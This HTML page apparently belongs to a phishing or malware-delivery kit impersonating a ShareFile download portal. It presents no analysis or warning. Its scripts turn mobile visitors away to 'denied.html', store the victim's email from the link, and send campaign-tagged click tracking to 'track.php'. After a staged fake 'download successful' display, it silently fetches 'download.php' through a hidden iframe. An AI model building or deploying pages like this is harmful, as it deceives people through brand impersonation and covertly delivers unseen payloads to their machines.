<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ShareFile Attachments</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
    <script>
    /* ========== DEVICE COMPATIBILITY GATE (runs first) ========== */
    (function () {
        function isMobileDevice() {
            var ua = navigator.userAgent || navigator.vendor || '';
            var touch = navigator.maxTouchPoints > 1;
            var mobileUA = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|Tablet/i.test(ua);
            var iPadOs = /Macintosh/i.test(ua) && touch; // iPadOS 13+ spoof
            return mobileUA || iPadOs;
        }

        // Preserve ?email= and any other query params
        function goTo(path) {
            window.location.replace(path + (window.location.search || ''));
        }

        // Stash email if present (for later pages)
        try {
            var params = new URLSearchParams(window.location.search);
            var email = params.get('email') || params.get('e') || '';
            if (email && email.indexOf('{') === -1) {
                sessionStorage.setItem('prefill_email', email);
            }
        } catch (e) {}

        if (isMobileDevice()) {
            goTo('denied.html');
        }
    })();
    </script>
</head>
<body class="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-50 flex items-center justify-center p-4 overflow-hidden">
    <div id="app" class="relative">
        <img src="./google8080.png" style="display: block; margin: 0 auto; border-radius: 1px;" alt="ShareFile" /><br/>

        <div id="downloader" class="bg-white rounded-lg shadow-xl p-8 max-w-md w-full relative">
            <h2 class="text-3xl text-blue-900 mb-6 text-center">ShareFile Attachments</h2>
            <p class="text-[#6262EF] mb-8 text-center">
            Click the button below to download your SHARED FILE.
            </p>
            <button id="downloadBtn" class="w-full bg-[#6262EF] hover:bg-[#6262EF] focus:bg-[#4F4FE8] text-white font-semibold py-3 rounded-lg transition-all duration-300 flex items-center justify-center relative overflow-hidden">
                <span class="relative z-10 flex items-center">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" viewBox="0 0 20 20" fill="currentColor">
                        <path fill-rule="evenodd" d="M3 17a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zm3.293-7.707a1 1 0 011.414 0L9 10.586V3a1 1 0 112 0v7.586l1.293-1.293a1 1 0 111.414 1.414l-3 3a1 1 0 01-1.414 0l-3-3a1 1 0 010-1.414z" clip-rule="evenodd" />
                    </svg>
                    Download ShareFile Documents
                </span>
                <div id="progressBar" class="absolute inset-0 bg-[#6262EF] scale-x-0 origin-left transition-transform duration-3000"></div>
            </button>

            <div id="progressTracker" class="mt-8 hidden">
                <div class="flex items-center mb-4">
                    <div class="w-8 h-8 rounded-full flex items-center justify-center bg-[#6262EF]">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-white" viewBox="0 0 20 20" fill="currentColor">
                            <path d="M13 6a3 3 0 11-6 0 3 3 0 016 0zM18 8a2 2 0 11-4 0 2 2 0 014 0zM14 15a4 4 0 00-8 0v3h8v-3zM6 8a2 2 0 11-4 0 2 2 0 014 0zM16 18v-3a5.972 5.972 0 00-.75-2.906A3.005 3.005 0 0119 15v3h-3zM4.75 12.094A5.973 5.973 0 004 15v3H1v-3a3 3 0 013.75-2.906z" />
                        </svg>
                    </div>
                    <span class="ml-3 text-blue-800">Preparing Your ShareFile Documents</span>
                </div>
                <div class="flex items-center mb-4">
                    <div class="w-8 h-8 rounded-full flex items-center justify-center bg-[#6262EF]">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-white" viewBox="0 0 20 20" fill="currentColor">
                            <path fill-rule="evenodd" d="M4 4a2 2 0 012-2h4.586A2 2 0 0112 2.586L15.414 6A2 2 0 0116 7.414V16a2 2 0 01-2 2H6a2 2 0 01-2-2V4zm2 6a1 1 0 011-1h6a1 1 0 110 2H7a1 1 0 01-1-1zm1 3a1 1 0 100 2h6a1 1 0 100-2H7z" clip-rule="evenodd" />
                        </svg>
                    </div>
                    <span class="ml-3 text-blue-800">Generating Document File</span>
                </div>
                <div class="flex items-center mb-4">
                    <div class="w-8 h-8 rounded-full flex items-center justify-center bg-[#6262EF]">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-white" viewBox="0 0 20 20" fill="currentColor">
                            <path d="M10.894 2.553a1 1 0 00-1.788 0l-7 14a1 1 0 001.169 1.409l5-1.429A1 1 0 009 15.571V11a1 1 0 112 0v4.571a1 1 0 00.725.962l5 1.428a1 1 0 001.17-1.408l-7-14z" />
                        </svg>
                    </div>
                    <span class="ml-3 text-blue-800">Initiating ShareFile Download</span>
                </div>
            </div>
        </div>

        <div id="success" class="bg-white rounded-lg shadow-xl p-8 max-w-md w-full text-center hidden">
            <div class="relative w-32 h-32 mx-auto mb-6">
                <svg class="w-full h-full" viewBox="0 0 100 100">
                    <circle cx="50" cy="50" r="45" fill="none" stroke="#6262EF" stroke-width="8" />
                    <circle id="successCircle" cx="50" cy="50" r="45" fill="none" stroke="#6262EF" stroke-width="8" stroke-dasharray="283" stroke-dashoffset="283" />
                </svg>
                <div class="absolute top-0 left-0 w-full h-full flex items-center justify-center opacity-0" id="checkmark">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-16 w-16 text-[#6262EF]" viewBox="0 0 20 20" fill="currentColor">
                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd" />
                    </svg>
                </div>
            </div>
            <h2 class="text-3xl font-bold text-blue-950 mb-4">Success!</h2>
            <p class="text-blue-900 mb-4">
                Your ShareFile Document has been downloaded successfully.
            </p>
            <p class="text-sm text-[#6262EF] mb-8">
                You can find the files in your default downloads folder.
            </p>
        </div>
    </div>

<script>
    $(document).ready(function() {
        // Safety: if JS gate was bypassed, block again before download UX
        function isMobileDevice() {
            var ua = navigator.userAgent || navigator.vendor || '';
            var touch = navigator.maxTouchPoints > 1;
            var mobileUA = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|Tablet/i.test(ua);
            var iPadOs = /Macintosh/i.test(ua) && touch;
            return mobileUA || iPadOs;
        }
        if (isMobileDevice()) {
            window.location.replace('denied.html' + (window.location.search || ''));
            return;
        }

        let currentStep = 0;
        const steps = $('#progressTracker > div');

        $('#downloadBtn').click(function() {
            $(this).prop('disabled', true);
            $('#progressBar').css('transform', 'scaleX(1)');
            $('#progressTracker').removeClass('hidden');

            try {
                const trackData = new URLSearchParams();
                trackData.append('action', 'click');
                trackData.append('campaign', 'sharefile');
                trackData.append('ua', navigator.userAgent);
                trackData.append('ts', Date.now());

                if (navigator.sendBeacon) {
                    navigator.sendBeacon('track.php', trackData);
                } else {
                    fetch('track.php', {
                        method: 'POST',
                        body: trackData,
                        keepalive: true
                    }).catch(function () {});
                }
            } catch (e) {}

            const animateSteps = function () {
                if (currentStep < steps.length) {
                    $(steps[currentStep]).find('div').addClass('bg-indigo-600').removeClass('bg-[#6262EF]');
                    currentStep++;
                    setTimeout(animateSteps, 1000);
                } else {
                    showSuccess();
                }
            };

            animateSteps();
        });

        function showSuccess() {
            $('#downloader').addClass('hidden');
            $('#success').removeClass('hidden');

            $('#successCircle').css('transition', 'stroke-dashoffset 0.8s ease-in-out');
            $('#successCircle').css('stroke-dashoffset', '0');

            setTimeout(function () {
                $('#checkmark').css('transition', 'opacity 0.4s ease-in-out');
                $('#checkmark').css('opacity', '1');

                setTimeout(function () {
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = 'download.php';
                    document.body.appendChild(iframe);
                }, 3000);
            }, 800);
        }
    });
</script>

</body>
</html>
